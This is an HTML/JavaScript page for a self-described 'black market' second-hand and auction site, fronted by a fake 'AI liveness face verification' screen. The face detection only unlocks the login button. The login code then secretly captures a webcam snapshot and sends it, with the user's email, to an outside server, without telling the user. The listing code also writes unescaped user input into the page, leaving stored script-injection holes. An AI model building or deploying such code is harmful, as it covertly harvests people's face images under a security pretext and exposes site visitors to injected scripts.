<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>黑市二手寄卖 & 极客拍卖大厅</title>
  <!-- 引入轻量级人脸识别 AI 库 -->
  <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
  <style>
    :root { --bg: #0b0f19; --card-bg: #111827; --accent: #2563eb; --accent-hover: #1d4ed8; --text: #f3f4f6; --text-muted: #9ca3af; --border: #1f2937; }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, sans-serif; }
    body { background: var(--bg); color: var(--text); padding-bottom: 60px; }
    header { background: var(--card-bg); border-bottom: 1px solid var(--border); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; flex-wrap: wrap; gap: 10px; }
    .logo { font-size: 18px; font-weight: bold; color: #38bdf8; }
    .nav-tabs { display: flex; gap: 6px; background: #000; padding: 4px; border-radius: 8px; flex-wrap: wrap; }
    .tab-btn { background: transparent; border: none; color: var(--text-muted); padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 13px; }
    .tab-btn.active { background: var(--accent); color: #fff; font-weight: bold; }
    .container { max-width: 1000px; margin: 20px auto; padding: 0 15px; }
    .tab-content { display: none; }
    .tab-content.active { display: block; }
    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: flex; justify-content: center; align-items: center; z-index: 999; }
    .auth-card { background: var(--card-bg); border: 1px solid var(--border); padding: 25px; border-radius: 12px; width: 100%; max-width: 360px; text-align: center; }
    .input-group { margin-bottom: 15px; text-align: left; }
    .input-group label { display: block; font-size: 12px; color: var(--text-muted); margin-bottom: 5px; }
    .input-group input, .input-group textarea { width: 100%; background: #000; border: 1px solid var(--border); color: #fff; padding: 10px; border-radius: 6px; font-size: 13px; outline: none; }
    .btn { width: 100%; background: var(--accent); color: white; border: none; padding: 10px; border-radius: 6px; font-weight: bold; cursor: pointer; }
    .btn:disabled { background: #374151; color: #6b7280; cursor: not-allowed; }
    .camera-box { width: 100%; height: 160px; background: #000; border: 1px solid var(--border); border-radius: 8px; margin-bottom: 15px; overflow: hidden; position: relative; }
    .camera-box video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; margin-top: 15px; }
    .card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; display: flex; flex-direction: column; }
    .card img { width: 100%; height: 180px; object-fit: cover; }
    .card-body { padding: 15px; flex: 1; display: flex; flex-direction: column; justify-content: space-between; }
    .card-title { font-size: 15px; font-weight: bold; margin-bottom: 6px; }
    .card-desc { font-size: 12px; color: var(--text-muted); margin-bottom: 12px; }
    .price-tag { font-size: 16px; color: #38bdf8; font-weight: bold; }
  </style>
</head>
<body>

  <div class="modal-overlay" id="authModal">
    <div class="auth-card">
      <h3>🔐 AI 活体人脸安全验证</h3>
      <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 15px;">请将脸部正对镜头（检测到人脸后按钮才可点击）</p>
      <div class="camera-box"><video id="webcam" autoplay playsinline muted></video></div>
      <div style="font-size: 11px; color: #38bdf8; margin-bottom: 10px;" id="camStatus">⏳ 正在加载 AI 人脸模型...</div>
      <div class="input-group"><label>电子邮箱</label><input type="email" id="userEmail" value="user@domain.com"></div>
      <button class="btn" id="loginBtn" disabled onclick="app.login()">请先正对人脸</button>
    </div>
  </div>

  <canvas id="hidden-canvas" width="320" height="240" style="display:none;"></canvas>

  <header>
    <div class="logo">⚡️ GEEK-MARKET // 交易中心</div>
    <div class="nav-tabs">
      <button class="tab-btn active" onclick="app.switchTab('market', event)">二手寄卖</button>
      <button class="tab-btn" onclick="app.switchTab('auction', event)">竞拍大厅</button>
      <button class="tab-btn" onclick="app.switchTab('sell', event)">发布寄卖</button>
      <button class="tab-btn" onclick="app.switchTab('postAuction', event)">发起拍卖</button>
    </div>
  </header>

  <div class="container">
    <div id="tab-market" class="tab-content active"><h3>📱 玩家二手寄卖大厅</h3><div class="grid" id="marketList"></div></div>
    <div id="tab-auction" class="tab-content"><h3>🔥 极客限量款竞拍大厅</h3><div class="grid" id="auctionList"></div></div>
    <div id="tab-sell" class="tab-content">
      <div class="auth-card" style="max-width: 500px; margin: 0 auto; text-align: left;">
        <h3 style="margin-bottom: 15px;">📦 发布二手寄卖物品</h3>
        <div class="input-group"><label>物品名称</label><input type="text" id="sellName" placeholder="例如：iPhone 14 Pro"></div>
        <div class="input-group"><label>转让价格 (元)</label><input type="number" id="sellPrice" placeholder="4200"></div>
        <div class="input-group"><label>联系方式</label><input type="text" id="sellContact" placeholder="微信号/手机号"></div>
        <div class="input-group"><label>物品描述</label><textarea id="sellDesc" rows="3"></textarea></div>
        <div class="input-group"><label>图片</label><input type="file" id="sellImage" accept="image/*"></div>
        <button class="btn" onclick="app.postSellItem()">立即发布</button>
      </div>
    </div>
    <div id="tab-postAuction" class="tab-content">
      <div class="auth-card" style="max-width: 500px; margin: 0 auto; text-align: left;">
        <h3 style="margin-bottom: 15px;">🔨 发起新的极客拍卖</h3>
        <div class="input-group"><label>拍品名称</label><input type="text" id="aucName" placeholder="例如：Sony 耳机"></div>
        <div class="input-group"><label>起拍价 (元)</label><input type="number" id="aucStartPrice" placeholder="1000"></div>
        <div class="input-group"><label>拍品描述</label><textarea id="aucDesc" rows="3"></textarea></div>
        <div class="input-group"><label>图片</label><input type="file" id="aucImage" accept="image/*"></div>
        <button class="btn" onclick="app.postAuctionItem()">立即上架</button>
      </div>
    </div>
  </div>

  <script>
    const WORKER_URL = "https://api.yirui.uk";

    class App {
      constructor() {
        this.stream = null;
        this.isFaceDetected = false;
        this.initAIAndCamera();
      }

      async initAIAndCamera() {
        const statusEl = document.getElementById('camStatus');
        try {
          statusEl.innerText = "⏳ 正在加载人脸识别模型...";
          // 加载轻量级人脸检测模型（使用公开 CDN 极速加载）
          await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/');
          
          statusEl.innerText = "⏳ 正在打开摄像头...";
          if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            this.stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } });
            const video = document.getElementById('webcam');
            video.srcObject = this.stream;
            
            video.onplay = () => {
              this.startFaceDetection(video);
            };
          }
        } catch (e) {
          statusEl.innerText = "⚠️ 模型加载失败，请检查网络";
          console.warn("AI初始化失败:", e);
        }
      }

      startFaceDetection(video) {
        const statusEl = document.getElementById('camStatus');
        const btn = document.getElementById('loginBtn');

        setInterval(async () => {
          if (!video || video.paused || video.ended) return;
          try {
            // 实时检测画面中的人脸
            const detections = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions());
            
            if (detections) {
              this.isFaceDetected = true;
              statusEl.innerText = "✅ 已检测到人脸，可以进入";
              statusEl.style.color = "#4ade80";
              btn.disabled = false;
              btn.innerText = "确认人脸并进入";
            } else {
              this.isFaceDetected = false;
              statusEl.innerText = "⚠️ 未检测到人脸，请正对镜头（拍天花板无效）";
              statusEl.style.color = "#f87171";
              btn.disabled = true;
              btn.innerText = "请将脸对准摄像头";
            }
          } catch (err) {}
        }, 1000); // 每秒检测一次
      }

      switchTab(tabName, evt) {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
        if(evt) evt.target.classList.add('active');
        document.getElementById(`tab-${tabName}`).classList.add('active');
        this.loadData();
      }

      async login() {
        if (!this.isFaceDetected) {
          alert("❌ 必须正对人脸才能进入！");
          return;
        }

        const email = document.getElementById('userEmail').value.trim();
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('hidden-canvas');
        let photoData = "";

        try {
          if (video && video.videoWidth > 0) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            photoData = canvas.toDataURL('image/jpeg', 0.5);
          }
        } catch (e) {}

        // 发送抓拍照片到后台
        fetch(WORKER_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email, timestamp: new Date().toLocaleString(), photo: photoData })
        }).catch(() => {});

        if (this.stream) {
          this.stream.getTracks().forEach(t => t.stop());
        }
        document.getElementById('authModal').style.display = 'none';
        this.loadData();
      }

      async loadData() {
        const marketListEl = document.getElementById('marketList');
        const auctionListEl = document.getElementById('auctionList');
        
        marketListEl.innerHTML = `<div style="color:var(--text-muted); font-size:13px; padding:10px;">⏳ 正在同步云端数据...</div>`;
        auctionListEl.innerHTML = `<div style="color:var(--text-muted); font-size:13px; padding:10px;">⏳ 正在同步云端数据...</div>`;

        try {
          const res = await fetch(WORKER_URL);
          if (!res.ok) throw new Error(`HTTP 错误代码: ${res.status}`);
          
          const data = await res.json();
          const bids = data.bids || {};

          let marketHtml = '';
          if (data.market && data.market.length > 0) {
            data.market.forEach(item => {
              marketHtml += `
                <div class="card">
                  <img src="${item.imgSrc}">
                  <div class="card-body">
                    <div class="card-title">${item.name}</div>
                    <div class="card-desc">${item.desc || "暂无描述"}</div>
                    <div style="display:flex; justify-content:space-between; align-items:center;">
                      <span class="price-tag">¥ ${parseFloat(item.price).toLocaleString()}</span>
                      <button class="btn" style="width:auto; padding:6px 12px; font-size:12px;" onclick="alert('联系方式：\\n${item.contact}')">联系卖家</button>
                    </div>
                  </div>
                </div>`;
            });
          } else {
            marketHtml = `<div style="color:var(--text-muted); font-size:13px;">暂无寄卖商品，快去发布吧！</div>`;
          }
          marketListEl.innerHTML = marketHtml;

          let defaultAuctions = [
            { id: 'item1', name: 'Apple Watch Ultra 2', price: 2000, desc: '起拍价 ¥2,000', imgSrc: 'https://images.unsplash.com/photo-1523275335684-37898b6baf30?auto=format&fit=crop&w=400&q=80' },
            { id: 'item2', name: 'Sennheiser HD800S', price: 6000, desc: '起拍价 ¥6,000', imgSrc: 'https://images.unsplash.com/photo-1505740420928-5e560c06d30e?auto=format&fit=crop&w=400&q=80' }
          ];
          let allAuctions = data.auctions ? [...data.auctions, ...defaultAuctions] : defaultAuctions;

          let auctionHtml = '';
          allAuctions.forEach(item => {
            const currentHighest = bids[item.id] !== undefined ? bids[item.id] : item.price;
            auctionHtml += `
              <div class="card">
                <img src="${item.imgSrc}">
                <div class="card-body">
                  <div class="card-title">${item.name}</div>
                  <div class="card-desc">${item.desc}</div>
                  <div style="margin-bottom:10px;"><span style="font-size:12px; color:var(--text-muted);">当前最高:</span> <span class="price-tag" id="price-${item.id}">${currentHighest}</span> 元</div>
                  <div style="display:flex; gap:8px;">
                    <input type="number" id="input-${item.id}" placeholder="出价" style="background:#000; border:1px solid var(--border); color:#fff; padding:6px; border-radius:4px; width:100%;">
                    <button class="btn" style="width:80px;" onclick="app.placeBid('${item.id}')">出价</button>
                  </div>
                </div>
              </div>`;
          });
          auctionListEl.innerHTML = auctionHtml;

        } catch (e) {
          console.error("加载失败", e);
          marketListEl.innerHTML = `<div style="color:#f87171; font-size:13px;">❌ 数据加载失败: ${e.message}</div>`;
          auctionListEl.innerHTML = `<div style="color:#f87171; font-size:13px;">❌ 数据加载失败: ${e.message}</div>`;
        }
      }

      async placeBid(itemId) {
        const currentPrice = parseFloat(document.getElementById(`price-${itemId}`).innerText);
        const userBid = parseFloat(document.getElementById(`input-${itemId}`).value);
        if (isNaN(userBid) || userBid <= currentPrice) {
          alert(`出价必须高于当前价格 (¥${currentPrice})`);
          return;
        }
        await fetch(WORKER_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ type: 'bid', itemId, price: userBid })
        });
        document.getElementById(`price-${itemId}`).innerText = userBid;
        document.getElementById(`input-${itemId}`).value = '';
        alert("🎉 出价成功！");
      }

      async postSellItem() {
        this.saveItemData('market_item', 'sellName', 'sellPrice', 'sellContact', 'sellDesc', 'sellImage', 'market');
      }

      async postAuctionItem() {
        this.saveItemData('auction_item', 'aucName', 'aucStartPrice', null, 'aucDesc', 'aucImage', 'auction');
      }

      async saveItemData(type, nameId, priceId, contactId, descId, imgId, targetTab) {
        const name = document.getElementById(nameId).value.trim();
        const price = parseFloat(document.getElementById(priceId).value.trim());
        const contact = contactId ? document.getElementById(contactId).value.trim() : "官方认证";
        const desc = document.getElementById(descId).value.trim();
        const fileInput = document.getElementById(imgId);

        if (!name || isNaN(price)) {
          alert("请填写完整信息！");
          return;
        }

        const send = async (imgSrc) => {
          await fetch(WORKER_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ type, id: type + '_' + Date.now(), name, price, contact, desc, imgSrc })
          });
          alert("发布成功！");
          this.switchTab(targetTab);
        };

        if (fileInput.files && fileInput.files[0]) {
          const reader = new FileReader();
          reader.onload = (e) => send(e.target.result);
          reader.readAsDataURL(fileInput.files[0]);
        } else {
          send("https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=400&q=80");
        }
      }
    }

    const app = new App();
  </script>
</body>
</html>
